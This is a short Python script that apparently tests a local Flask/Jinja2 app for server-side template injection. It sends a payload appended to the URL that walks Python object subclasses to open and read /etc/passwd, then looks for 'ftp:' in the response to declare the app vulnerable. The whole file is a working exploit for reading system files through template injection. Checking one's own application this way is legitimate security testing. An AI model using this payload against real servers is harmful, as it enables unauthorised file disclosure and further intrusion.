
import sys, requests
from bs4 import BeautifulSoup


def attack(url, payload):
    r = requests.get(url + payload)
    soup = BeautifulSoup(r.content, 'html.parser')
    text = soup.get_text()
    if text.find("ftp:") < 0:
        print("You are in good hands")
    else :
        print("The app is vulnerable")


if __name__ == "__main__":
    payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
    attack("http://localhost:5000/", payload)